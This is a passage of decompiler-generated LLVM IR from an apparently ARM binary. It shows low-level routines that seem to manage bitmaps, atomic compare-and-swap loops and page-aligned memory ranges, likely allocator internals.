  %v7_139d4 = shl i32 %v5_139c8, %v1_139d0
  %v8_139d4 = or i32 %v7_139d4, %v6_139cc
  store i32 %v8_139d4, i32* %r3.global-to-local, align 4
  %v1_139d8 = add i32 %v1_139cc, -32
  store i32 %v1_139d8, i32* %r1.global-to-local, align 4
  %v6_139d8 = icmp slt i32 %v1_139d8, 0
  br i1 %v6_139d8, label %bb66, label %bb65

bb65:                                             ; preds = %dec_label_pc_139c4
  %v7_139dc = lshr i32 %v5_139c8, %v1_139d8
  store i32 %v7_139dc, i32* %r3.global-to-local, align 4
  br label %bb66

bb66:                                             ; preds = %dec_label_pc_139c4, %bb65
  %v0_139e0 = phi i32 [ %v8_139d4, %dec_label_pc_139c4 ], [ %v7_139dc, %bb65 ]
  %v1_139e0 = urem i32 %v0_139e0, 2
  store i32 %v1_139e0, i32* %r0.global-to-local, align 4
  %v2_139e0 = icmp eq i32 %v1_139e0, 0
  br i1 %v2_139e0, label %dec_label_pc_139e8, label %dec_label_pc_13a44

dec_label_pc_139e8:                               ; preds = %bb66
  store i32 1, i32* %r2.global-to-local, align 4
  %v2_139ec = icmp eq i32 %v1_139d8, 0
  store i1 %v2_139ec, i1* @cpsr_z, align 1
  %v7_139f0 = lshr i32 1, %v1_139d0
  store i32 %v7_139f0, i32* %r4.global-to-local, align 4
  %v6_139f4 = shl i32 1, %v1_139cc
  store i32 %v6_139f4, i32* %r3.global-to-local, align 4
  br i1 %v6_139d8, label %bb68, label %bb67

bb67:                                             ; preds = %dec_label_pc_139e8
  %v9_139f8 = shl i32 1, %v1_139d8
  store i32 %v9_139f8, i32* %r4.global-to-local, align 4
  br label %bb68

bb68:                                             ; preds = %dec_label_pc_139e8, %bb67
  %v0_13a00 = phi i32 [ %v7_139f0, %dec_label_pc_139e8 ], [ %v9_139f8, %bb67 ]
  store i32 %v6_139f4, i32* %r5.global-to-local, align 4
  store i32 %v2_139c8, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_223b8.560 to i32), i32* %r2.global-to-local, align 4
  %v2_13a1473 = or i32 %v2_139c8, %v6_139f4
  store i32 %v2_13a1473, i32* %r1.global-to-local, align 4
  %v4_13a1874 = call i32 @function_15cec(i32 %v2_139c8, i32 %v2_13a1473, i32* nonnull @global_var_223b8.560)
  store i32 %v4_13a1874, i32* %r0.global-to-local, align 4
  %v2_13a1c76 = icmp eq i32 %v4_13a1874, 0
  store i1 %v2_13a1c76, i1* @cpsr_z, align 1
  br i1 %v2_13a1c76, label %dec_label_pc_13a24, label %dec_label_pc_13a0c.dec_label_pc_13a0c_crit_edge

dec_label_pc_13a0c.dec_label_pc_13a0c_crit_edge:  ; preds = %bb68, %dec_label_pc_13a0c.dec_label_pc_13a0c_crit_edge
  %v2_13a0c.pre = load i32, i32* @global_var_223b8.560, align 4
  %v1_13a14.pre = load i32, i32* %r5.global-to-local, align 4
  store i32 %v2_13a0c.pre, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_223b8.560 to i32), i32* %r2.global-to-local, align 4
  %v2_13a14 = or i32 %v2_13a0c.pre, %v1_13a14.pre
  store i32 %v2_13a14, i32* %r1.global-to-local, align 4
  %v4_13a18 = call i32 @function_15cec(i32 %v2_13a0c.pre, i32 %v2_13a14, i32* nonnull @global_var_223b8.560)
  store i32 %v4_13a18, i32* %r0.global-to-local, align 4
  %v2_13a1c = icmp eq i32 %v4_13a18, 0
  store i1 %v2_13a1c, i1* @cpsr_z, align 1
  br i1 %v2_13a1c, label %dec_label_pc_13a24, label %dec_label_pc_13a0c.dec_label_pc_13a0c_crit_edge

dec_label_pc_13a24:                               ; preds = %dec_label_pc_13a0c.dec_label_pc_13a0c_crit_edge, %bb68
  store i32 ptrtoint (i32* @global_var_223bc.562 to i32), i32* %r5.global-to-local, align 4
  store i32 %v0_13a00, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13a2c

dec_label_pc_13a2c:                               ; preds = %dec_label_pc_13a2c.dec_label_pc_13a2c_crit_edge, %dec_label_pc_13a24
  %v1_13a34 = phi i32 [ %v1_13a34.pre, %dec_label_pc_13a2c.dec_label_pc_13a2c_crit_edge ], [ %v0_13a00, %dec_label_pc_13a24 ]
  %v2_13a2c = load i32, i32* @global_var_223bc.562, align 4
  store i32 %v2_13a2c, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_223bc.562 to i32), i32* %r2.global-to-local, align 4
  %v2_13a34 = or i32 %v2_13a2c, %v1_13a34
  store i32 %v2_13a34, i32* %r1.global-to-local, align 4
  %v4_13a38 = call i32 @function_15cec(i32 %v2_13a2c, i32 %v2_13a34, i32* nonnull @global_var_223bc.562)
  store i32 %v4_13a38, i32* %r0.global-to-local, align 4
  %v2_13a3c = icmp eq i32 %v4_13a38, 0
  store i1 %v2_13a3c, i1* @cpsr_z, align 1
  br i1 %v2_13a3c, label %dec_label_pc_13a44.loopexit, label %dec_label_pc_13a2c.dec_label_pc_13a2c_crit_edge

dec_label_pc_13a2c.dec_label_pc_13a2c_crit_edge:  ; preds = %dec_label_pc_13a2c
  %v1_13a34.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13a2c

dec_label_pc_13a44.loopexit:                      ; preds = %dec_label_pc_13a2c
  %v1_13a48.pre = load i32, i32* @sb, align 4
  br label %dec_label_pc_13a44

dec_label_pc_13a44:                               ; preds = %dec_label_pc_13a44.loopexit, %bb66
  %v1_13a48 = phi i32 [ %v1_13a48.pre, %dec_label_pc_13a44.loopexit ], [ %v0_1386c, %bb66 ]
  store i32 ptrtoint (i32* @global_var_223b8.560 to i32), i32* @r0, align 4
  %v0_13a48 = load i32, i32* @fp, align 4
  %v2_13a48 = inttoptr i32 %v1_13a48 to i32*
  store i32 %v0_13a48, i32* %v2_13a48, align 4
  %v0_13a4c = load i32, i32* @fp, align 4
  %v1_13a4c = load i32, i32* @r8, align 4
  %v2_13a4c = add i32 %v1_13a4c, 4
  %v3_13a4c = inttoptr i32 %v2_13a4c to i32*
  store i32 %v0_13a4c, i32* %v3_13a4c, align 4
  %v3_13a50 = load i32, i32* @global_var_227c0.568, align 4
  store i32 %v3_13a50, i32* %r3.global-to-local, align 4
  %v2_13a54 = icmp eq i32 %v3_13a50, 0
  store i1 %v2_13a54, i1* @cpsr_z, align 1
  %v0_13a58 = load i32, i32* @r0, align 4
  store i32 %v0_13a58, i32* %r4.global-to-local, align 4
  br i1 %v2_13a54, label %dec_label_pc_13aac, label %dec_label_pc_13a60

dec_label_pc_13a60:                               ; preds = %dec_label_pc_13a44
  %v0_13a60 = call i32 @function_15c98()
  store i32 %v0_13a60, i32* @r0, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_13a68 = add i32 %v0_13a60, 1032
  %v3_13a68 = inttoptr i32 %v2_13a68 to i32*
  store i32 0, i32* %v3_13a68, align 4
  %v0_13a6c = call i32 @function_15c98()
  store i32 %v0_13a6c, i32* %r0.global-to-local, align 4
  %v1_13a70 = add i32 %v0_13a6c, 1036
  %v2_13a70 = inttoptr i32 %v1_13a70 to i32*
  %v3_13a70 = load i32, i32* %v2_13a70, align 4
  store i32 %v3_13a70, i32* %r3.global-to-local, align 4
  %v2_13a74 = icmp eq i32 %v3_13a70, 0
  br i1 %v2_13a74, label %dec_label_pc_13aac, label %dec_label_pc_13a7c

dec_label_pc_13a7c:                               ; preds = %dec_label_pc_13a60
  %v1_13a80 = add i32 %v0_13a6c, 1032
  store i32 %v1_13a80, i32* %r0.global-to-local, align 4
  store i32 129, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_13a98 = icmp eq i32 %v1_13a80, -38
  br i1 %v4_13a98, label %dec_label_pc_13a9c, label %dec_label_pc_13aac

dec_label_pc_13a9c:                               ; preds = %dec_label_pc_13a7c
  store i32 ptrtoint (i32* @global_var_227c0.568 to i32), i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_13aac

dec_label_pc_13aac:                               ; preds = %dec_label_pc_13a7c, %dec_label_pc_13a9c, %dec_label_pc_13a60, %dec_label_pc_13a44
  store i32 ptrtoint (i32* @global_var_223b8.560 to i32), i32* %r2.global-to-local, align 4
  %v3_13ab4 = mul i32 %v1_13840, 16
  %v2_13ab8 = add i32 %v3_13ab4, ptrtoint (i32* @global_var_223b8.560 to i32)
  store i32 %v2_13ab8, i32* %r3.global-to-local, align 4
  %v1_13abc = add i32 %v3_13ab4, add (i32 ptrtoint (i32* @global_var_223b8.560 to i32), i32 -8)
  store i32 %v1_13abc, i32* %r1.global-to-local, align 4
  %v1_13ac0 = load i32, i32* @r8, align 4
  %v2_13ac0 = add i32 %v1_13ac0, 8
  %v3_13ac0 = inttoptr i32 %v2_13ac0 to i32*
  store i32 %v1_13abc, i32* %v3_13ac0, align 4
  %v0_13ac4 = load i32, i32* %r3.global-to-local, align 4
  %v1_13ac4 = add i32 %v0_13ac4, 4
  %v2_13ac4 = inttoptr i32 %v1_13ac4 to i32*
  %v3_13ac4 = load i32, i32* %v2_13ac4, align 4
  store i32 %v3_13ac4, i32* %r2.global-to-local, align 4
  %v1_13ac8 = load i32, i32* @r8, align 4
  %v2_13ac8 = add i32 %v1_13ac8, 12
  %v3_13ac8 = inttoptr i32 %v2_13ac8 to i32*
  store i32 %v3_13ac4, i32* %v3_13ac8, align 4
  %v0_13acc = load i32, i32* @r8, align 4
  %v1_13acc = load i32, i32* %r1.global-to-local, align 4
  %v2_13acc = add i32 %v1_13acc, 12
  %v3_13acc = inttoptr i32 %v2_13acc to i32*
  store i32 %v0_13acc, i32* %v3_13acc, align 4
  store i32 %stack_var_-44.3, i32* @r0, align 4
  %v0_13ad4 = load i32, i32* @r8, align 4
  %v1_13ad4 = add i32 %v0_13ad4, 12
  %v2_13ad4 = inttoptr i32 %v1_13ad4 to i32*
  %v3_13ad4 = load i32, i32* %v2_13ad4, align 4
  store i32 %v3_13ad4, i32* %r3.global-to-local, align 4
  %v2_13ad8 = icmp eq i32 %stack_var_-44.3, 0
  %v2_13adc = add i32 %v3_13ad4, 8
  %v3_13adc = inttoptr i32 %v2_13adc to i32*
  store i32 %v0_13ad4, i32* %v3_13adc, align 4
  store i32 ptrtoint (i32* @global_var_223b8.560 to i32), i32* @r4, align 4
  br i1 %v2_13ad8, label %dec_label_pc_13ae8, label %dec_label_pc_13c40

dec_label_pc_13ae8:                               ; preds = %dec_label_pc_13aac, %dec_label_pc_13c40
  %v1_13af4 = phi i32 [ ptrtoint (i32* @global_var_223b8.560 to i32), %dec_label_pc_13aac ], [ %v1_13aec.pre, %dec_label_pc_13c40 ]
  %v0_13ae8 = load i32, i32* @r6, align 4
  %v1_13ae8 = add i32 %v0_13ae8, 8
  store i32 %v1_13ae8, i32* %r2.global-to-local, align 4
  %v2_13aec = add i32 %v1_13ae8, %v1_13af4
  %v3_13aec = inttoptr i32 %v2_13aec to i32*
  %v4_13aec = load i32, i32* %v3_13aec, align 4
  store i32 %v4_13aec, i32* @r3, align 4
  %v2_13af0 = icmp eq i32 %v4_13aec, 0
  store i1 %v2_13af0, i1* @cpsr_z, align 1
  store i32 %v2_13aec, i32* %r5.global-to-local, align 4
  br i1 %v2_13af0, label %dec_label_pc_13ae8.dec_label_pc_13b44_crit_edge, label %dec_label_pc_13afc

dec_label_pc_13ae8.dec_label_pc_13b44_crit_edge:  ; preds = %dec_label_pc_13ae8
  %v1_13b4c.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_13b44

dec_label_pc_13afc:                               ; preds = %dec_label_pc_13ae8
  %v0_13afc = call i32 @function_15c98()
  store i32 %v0_13afc, i32* @r0, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_13b04 = load i32, i32* %r2.global-to-local, align 4
  %v2_13b04 = load i32, i32* @r4, align 4
  %v3_13b04 = add i32 %v2_13b04, %v1_13b04
  %v4_13b04 = inttoptr i32 %v3_13b04 to i32*
  store i32 0, i32* %v4_13b04, align 4
  %v0_13b08 = call i32 @function_15c98()
  store i32 %v0_13b08, i32* %r0.global-to-local, align 4
  %v0_13b0c = load i32, i32* @r6, align 4
  %v1_13b0c = add i32 %v0_13b0c, 12
  store i32 %v1_13b0c, i32* @r3, align 4
  %v1_13b10 = load i32, i32* @r4, align 4
  %v2_13b10 = add i32 %v1_13b10, %v1_13b0c
  %v3_13b10 = inttoptr i32 %v2_13b10 to i32*
  %v4_13b10 = load i32, i32* %v3_13b10, align 4
  store i32 %v4_13b10, i32* %r2.global-to-local, align 4
  %v2_13b14 = icmp eq i32 %v4_13b10, 0
  br i1 %v2_13b14, label %dec_label_pc_13b44, label %dec_label_pc_13b1c

dec_label_pc_13b1c:                               ; preds = %dec_label_pc_13afc
  %v0_13b20 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_13b20, i32* %r0.global-to-local, align 4
  store i32 129, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_13b34 = icmp eq i32 %v0_13b20, -38
  br i1 %v4_13b34, label %dec_label_pc_13b38, label %dec_label_pc_13b44

dec_label_pc_13b38:                               ; preds = %dec_label_pc_13b1c
  store i32 -38, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_13b44

dec_label_pc_13b44:                               ; preds = %dec_label_pc_13ae8.dec_label_pc_13b44_crit_edge, %dec_label_pc_13b1c, %dec_label_pc_13b38, %dec_label_pc_13afc, %dec_label_pc_13780, %bb70
  %v1_13b4c = phi i32 [ %v1_13b4c.pre, %dec_label_pc_13ae8.dec_label_pc_13b44_crit_edge ], [ %v0_13b20, %dec_label_pc_13b1c ], [ -38, %dec_label_pc_13b38 ], [ %v0_13b08, %dec_label_pc_13afc ], [ 0, %dec_label_pc_13780 ], [ %v1_13bf8, %bb70 ]
  store i32 %v3_13780, i32* @r4, align 4
  store i32 %v6_13780, i32* @r5, align 4
  store i32 %v9_13780, i32* @r6, align 4
  store i32 %v12_13780, i32* @r7, align 4
  store i32 %v15_13780, i32* @r8, align 4
  store i32 %v18_13780, i32* @sb, align 4
  store i32 %v21_13780, i32* @sl, align 4
  store i32 %v24_13780, i32* @fp, align 4
  ret i32 %v1_13b4c

dec_label_pc_13b58:                               ; preds = %dec_label_pc_13b9c
  %v0_13b5c = load i32, i32* @r6, align 4
  store i32 1, i32* @r2, align 4
  %v2_13b64 = add i32 %v0_13b5c, add (i32 ptrtoint (i32* @global_var_223b8.560 to i32), i32 12)
  store i32 %v2_13b64, i32* %r1.global-to-local, align 4
  %v0_13b68 = load i32, i32* @r5, align 4
  store i32 %v0_13b68, i32* %r0.global-to-local, align 4
  store i32 1, i32* @r3, align 4
  %v2_13b70 = inttoptr i32 %v0_13b68 to i32*
  %v3_13b70 = call i32 @function_15818(i32* %v2_13b70, i32 %v2_13b64)
  store i32 %v3_13b70, i32* %r0.global-to-local, align 4
  %v0_13b78.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_13b74

dec_label_pc_13b74:                               ; preds = %dec_label_pc_1381c, %dec_label_pc_13b58
  %v0_13b78 = phi i32 [ %v0_13b78.pre, %dec_label_pc_13b58 ], [ %v3_13824, %dec_label_pc_1381c ]
  store i32 ptrtoint (i32* @global_var_223b8.560 to i32), i32* %r0.global-to-local, align 4
  %v1_13b78 = add i32 %v0_13b78, 8
  store i32 %v1_13b78, i32* %r3.global-to-local, align 4
  %v2_13b7c = add i32 %v0_13b78, add (i32 ptrtoint (i32* @global_var_223b8.560 to i32), i32 8)
  store i32 %v2_13b7c, i32* @r7, align 4
  br label %dec_label_pc_13b80

dec_label_pc_13b80:                               ; preds = %dec_label_pc_13b80.dec_label_pc_13b80_crit_edge, %dec_label_pc_13b74
  %v0_13b80 = phi i32 [ %v0_13b80.pre, %dec_label_pc_13b80.dec_label_pc_13b80_crit_edge ], [ %v2_13b7c, %dec_label_pc_13b74 ]
  %v1_13b80 = inttoptr i32 %v0_13b80 to i32*
  %v2_13b80 = load i32, i32* %v1_13b80, align 4
  store i32 %v2_13b80, i32* @r4, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v2_13b80, i32* %r0.global-to-local, align 4
  store i32 %v0_13b80, i32* %r2.global-to-local, align 4
  %v4_13b90 = call i32 @function_15cec(i32 %v2_13b80, i32 1, i32* %v1_13b80)
  store i32 %v4_13b90, i32* %r0.global-to-local, align 4
  %v2_13b94 = icmp eq i32 %v4_13b90, 0
  store i1 %v2_13b94, i1* @cpsr_z, align 1
  br i1 %v2_13b94, label %dec_label_pc_13b9c, label %dec_label_pc_13b80.dec_label_pc_13b80_crit_edge

dec_label_pc_13b80.dec_label_pc_13b80_crit_edge:  ; preds = %dec_label_pc_13b80
  %v0_13b80.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_13b80

dec_label_pc_13b9c:                               ; preds = %dec_label_pc_13b80
  %v0_13b50 = load i32, i32* @r4, align 4
  %v2_13b50 = icmp eq i32 %v0_13b50, 0
  br i1 %v2_13b50, label %dec_label_pc_1383c.loopexit, label %dec_label_pc_13b58

dec_label_pc_13ba0:                               ; preds = %dec_label_pc_13ba0, %dec_label_pc_13bd8, %dec_label_pc_13858
  %v3_13ba4 = load i32, i32* @global_var_227c0.568, align 4
  store i32 %v3_13ba4, i32* @r4, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_227c0.568 to i32), i32* %r2.global-to-local, align 4
  store i32 %v3_13ba4, i32* %r0.global-to-local, align 4
  %v4_13bb4 = call i32 @function_15cec(i32 %v3_13ba4, i32 1, i32* nonnull @global_var_227c0.568)
  %v2_13bb8 = icmp eq i32 %v4_13bb4, 0
  store i1 %v2_13bb8, i1* @cpsr_z, align 1
  store i32 ptrtoint (i32* @global_var_227c0.568 to i32), i32* %r0.global-to-local, align 4
  store i32 1, i32* @r2, align 4
  store i32 1, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_227c4.572 to i32), i32* %r1.global-to-local, align 4
  br i1 %v2_13bb8, label %dec_label_pc_13bd0, label %dec_label_pc_13ba0

dec_label_pc_13bd0:                               ; preds = %dec_label_pc_13ba0
  %v0_13bd0 = load i32, i32* @r4, align 4
  %v2_13bd0 = icmp eq i32 %v0_13bd0, 0
  br i1 %v2_13bd0, label %dec_label_pc_13868, label %dec_label_pc_13bd8

dec_label_pc_13bd8:                               ; preds = %dec_label_pc_13bd0
  %v3_13bd8 = call i32 @function_15818(i32* nonnull @global_var_227c0.568, i32 ptrtoint (i32* @global_var_227c4.572 to i32))
  store i32 %v3_13bd8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_13ba0

dec_label_pc_13be0:                               ; preds = %dec_label_pc_13790
  %v2_13be0 = inttoptr i32 %v1_13790 to i32*
  %v3_13be0 = load i32, i32* %v2_13be0, align 4
  store i32 %v3_13be0, i32* %r0.global-to-local, align 4
  %v1_13be4 = and i32 %v3_13794, -2
  %v1_13be8 = urem i32 %v3_13be0, 2
  %v2_13be8 = icmp eq i32 %v1_13be8, 0
  %v2_13bec = add i32 %v3_13be0, %v1_13be4
  store i32 %v2_13bec, i32* @r1, align 4
  br i1 %v2_13be8, label %bb70, label %bb69

bb69:                                             ; preds = %dec_label_pc_13be0
  call void @llvm.trap()
  unreachable

bb70:                                             ; preds = %dec_label_pc_13be0
  %v2_13bf4 = sub i32 %v1_13790, %v3_13be0
  store i32 %v2_13bf4, i32* %r0.global-to-local, align 4
  %v1_13bf8 = call i32 @function_146f4(i32 %v2_13bf4)
  store i32 %v1_13bf8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_13b44

dec_label_pc_13c00:                               ; preds = %dec_label_pc_1383c
  store i32 %v1_13840, i32* %r0.global-to-local, align 4
  %v3_13c04 = mul i32 %v1_13840, 16
  %v2_13c08 = add i32 %v3_13c04, ptrtoint (i32* @global_var_223b8.560 to i32)
  store i32 %v2_13c08, i32* %r3.global-to-local, align 4
  %v1_13c0c = add i32 %v3_13c04, add (i32 ptrtoint (i32* @global_var_223b8.560 to i32), i32 -8)
  store i32 %v1_13c0c, i32* %r2.global-to-local, align 4
  store i32 %v1_13c0c, i32* %v6_13844, align 4
  %v0_13c14 = load i32, i32* %r2.global-to-local, align 4
  %v1_13c14 = load i32, i32* %r3.global-to-local, align 4
  %v2_13c14 = add i32 %v1_13c14, 4
  %v3_13c14 = inttoptr i32 %v2_13c14 to i32*
  store i32 %v0_13c14, i32* %v3_13c14, align 4
  br label %dec_label_pc_13858

dec_label_pc_13c1c:                               ; preds = %dec_label_pc_138a8
  store i32 ptrtoint (i32* @global_var_227c0.568 to i32), i32* @r0, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_138c8

dec_label_pc_13c30:                               ; preds = %dec_label_pc_13900
  store i32 %v0_13904, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1391c.preheader

dec_label_pc_13c40:                               ; preds = %dec_label_pc_13aac
  %v0_13c40 = load i32, i32* @r8, align 4
  %v0_13c44 = load i32, i32* @sb, align 4
  %v1_13c44 = add i32 %v0_13c44, -16
  %v1_13c48 = add i32 %v0_13c40, 4111
  %v1_13c54 = and i32 %v1_13c48, -4096
  store i32 %v1_13c54, i32* @r0, align 4
  %v1_13c58 = and i32 %v1_13c44, -4096
  %v2_13c5c = sub i32 %v1_13c58, %v1_13c54
  store i32 %v2_13c5c, i32* %r1.global-to-local, align 4
  store i32 4, i32* @r2, align 4
  %v4_13c64 = call i32 @function_145dc(i32 %v1_13c54, i32 %v2_13c5c, i32 4, i32 %v3_13ad4)
  store i32 %v4_13c64, i32* @r0, align 4
  %v1_13aec.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_13ae8

; uselistorder directives
  uselistorder i32 %v3_13c04, { 1, 0 }
  uselistorder i32 %v1_13bf8, { 1, 0 }
  uselistorder i32 %v3_13be0, { 2, 1, 0, 3 }
  uselistorder i32 %v0_13b80, { 1, 0 }
  uselistorder i32 %v0_13b78, { 1, 0 }
  uselistorder i32 %v3_13ab4, { 1, 0 }
  uselistorder i32 %v2_13a2c, { 1, 0, 2 }
  uselistorder i32 %v2_13a0c.pre, { 0, 2, 1 }
  uselistorder i32 %v7_139f0, { 1, 0 }
  uselistorder i32 %v1_139e0, { 1, 0 }
  uselistorder i32 %v1_139d8, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_139b0, { 1, 0 }
  uselistorder i32 %v2_139a8, { 1, 0 }
  uselistorder i32 %v2_139a4, { 1, 2, 0 }
  uselistorder i32 %v2_13984, { 1, 0, 2 }
  uselistorder i32 %v1_13980, { 0, 1, 4, 2, 3, 5 }
  uselistorder i32 %v0_137d0.pre, { 1, 2, 0 }
  uselistorder i32 %stack_var_-44.5, { 1, 2, 3, 0 }
  uselistorder i32 %v2_13944, { 1, 0, 2 }
  uselistorder i32 %v1_13940, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v0_1391c, { 1, 0 }
  uselistorder i32 %v0_13904, { 1, 0, 2 }
  uselistorder i32 %v1_13874, { 1, 0 }
  uselistorder i32 %v1_13840, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v3_13824, { 2, 1, 0 }
  uselistorder i32 %v0_13824, { 1, 0 }
  uselistorder i32 %v3_13814, { 1, 0 }
  uselistorder i32 %v4_137fc, { 1, 0, 2 }
  uselistorder i32 %v0_137f0, { 1, 0 }
  uselistorder i32 %stack_var_-44.2, { 1, 0 }
  uselistorder i32 %v2_137a4, { 1, 0, 2 }
  uselistorder i32 %v1_137a0, { 0, 4, 1, 5, 3, 2, 6 }
  uselistorder i32 %v1_13798, { 1, 0 }
  uselistorder i32 %v3_13794, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v1_13790, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v0_13784, { 1, 0, 2 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 0, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29 }
  uselistorder i32* %r1.global-to-local, { 2, 3, 4, 5, 6, 8, 7, 9, 10, 11, 12, 13, 14, 15, 16, 0, 17, 18, 19, 20, 21, 22, 24, 25, 26, 23, 27, 28, 29, 1, 30 }
  uselistorder i32* %r0.global-to-local, { 6, 7, 2, 8, 9, 11, 10, 12, 19, 15, 16, 14, 13, 18, 17, 20, 21, 22, 23, 25, 24, 29, 26, 4, 3, 27, 28, 5, 30, 31, 34, 33, 32, 35, 36, 37, 38, 0, 1 }
  uselistorder i32 1032, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_13ba0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13b74, { 1, 0 }
  uselistorder label %dec_label_pc_13b44, { 5, 2, 1, 3, 0, 4 }
  uselistorder label %dec_label_pc_13ae8, { 1, 0 }
  uselistorder label %dec_label_pc_13aac, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_13a0c.dec_label_pc_13a0c_crit_edge, { 1, 0 }
  uselistorder label %bb68, { 1, 0 }
  uselistorder label %bb66, { 1, 0 }
  uselistorder label %dec_label_pc_139a4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13968, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_1391c, { 1, 0 }
  uselistorder label %dec_label_pc_1391c.preheader, { 0, 4, 3, 2, 1 }
  uselistorder label %dec_label_pc_138c8, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_13858, { 1, 0 }
  uselistorder label %dec_label_pc_1381c, { 2, 0, 1 }
  uselistorder label %bb62, { 1, 0 }
}

define i32 @function_13c7c() local_unnamed_addr {
dec_label_pc_13c7c:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v3_13c7c = load i32, i32* @r4, align 4
  %v6_13c7c = load i32, i32* @r5, align 4
  %v9_13c7c = load i32, i32* @r6, align 4
  %v12_13c7c = load i32, i32* @r7, align 4
  %v15_13c7c = load i32, i32* @r8, align 4
  %v18_13c7c = load i32, i32* @sb, align 4
  %v21_13c7c = load i32, i32* @sl, align 4
  %v24_13c7c = load i32, i32* @fp, align 4
  store i32 2147479535, i32* %r3.global-to-local, align 4
  %v0_13c88 = load i32, i32* @r0, align 4
  %v1_13c88 = add i32 %v0_13c88, -1
  store i32 %v1_13c88, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v1_13c88, 2147479536
  br i1 %tmp, label %dec_label_pc_14028, label %dec_label_pc_13c98

dec_label_pc_13c98:                               ; preds = %dec_label_pc_13c7c
  %v2_13c98 = icmp eq i32 %v0_13c88, 0
  br i1 %v2_13c98, label %.thread, label %dec_label_pc_14300

.thread:                                          ; preds = %dec_label_pc_13c98
  store i32 16, i32* %r1.global-to-local, align 4
  store i32 0, i32* @sb, align 4
  br label %dec_label_pc_13cac

dec_label_pc_13cac:                               ; preds = %.thread43, %.thread, %dec_label_pc_14050
  %v1_13cc4 = phi i32 [ %v1_14060, %dec_label_pc_14050 ], [ 0, %.thread ], [ %v1_14040, %.thread43 ]
  %v0_1406c = phi i32 [ %v1_1402c, %dec_label_pc_14050 ], [ 16, %.thread ], [ %v1_1402c, %.thread43 ]
  store i32 1, i32* %r2.global-to-local, align 4
  %v1_13cb0 = sub nsw i32 32, %v1_13cc4
  store i32 %v1_13cb0, i32* %r1.global-to-local, align 4
  %v7_13cb8 = lshr i32 1, %v1_13cb0
  store i32 %v7_13cb8, i32* %r4.global-to-local, align 4
  %v1_13cbc = add nsw i32 %v1_13cc4, -32
  store i32 %v1_13cbc, i32* %r0.global-to-local, align 4
  %v6_13cbc = icmp slt i32 %v1_13cc4, 32
  br i1 %v6_13cbc, label %bb64, label %bb

bb:                                               ; preds = %dec_label_pc_13cac
  %v7_13cc0 = shl i32 1, %v1_13cbc
  store i32 %v7_13cc0, i32* %r4.global-to-local, align 4
  br label %bb64

bb64:                                             ; preds = %dec_label_pc_13cac, %bb
  %v0_13ccc = phi i32 [ %v7_13cb8, %dec_label_pc_13cac ], [ %v7_13cc0, %bb ]
  %v1_13cc8 = shl i32 -1, %v1_13cc4
  %v6_13ccc = sub i32 -1, %v0_13ccc
  store i32 ptrtoint (i32* @global_var_223b8.560 to i32), i32* @sl, align 4
  store i32 ptrtoint (i8** @global_var_22adc.527 to i32), i32* @fp, align 4
  %v2_13ce070 = load i32, i32* @global_var_223b8.560, align 4
  %v5_13ce071 = load i32, i32* @global_var_223bc.562, align 4
  store i32 %v5_13ce071, i32* @r4, align 4
  %v2_13cec72 = and i32 %v2_13ce070, %v1_13cc8
  store i32 %v2_13cec72, i32* %r1.global-to-local, align 4
  %v2_13cf073 = and i32 %v5_13ce071, %v6_13ccc
  store i32 %v2_13cf073, i32* %r2.global-to-local, align 4
  %v2_13cf474 = or i32 %v2_13cf073, %v2_13cec72
  store i32 %v2_13cf474, i32* %r3.global-to-local, align 4
  %v4_13cf476 = icmp eq i32 %v2_13cf474, 0
  br i1 %v4_13cf476, label %dec_label_pc_13e28, label %dec_label_pc_13cfc.preheader

dec_label_pc_13ce0.loopexit:                      ; preds = %dec_label_pc_13dac, %dec_label_pc_13dc4, %dec_label_pc_13de4
  %v2_13ce0 = load i32, i32* @global_var_223b8.560, align 4
  %v5_13ce0 = load i32, i32* @global_var_223bc.562, align 4
  store i32 %v5_13ce0, i32* @r4, align 4
  %v2_13cec = and i32 %v2_13ce0, %v1_13cc8
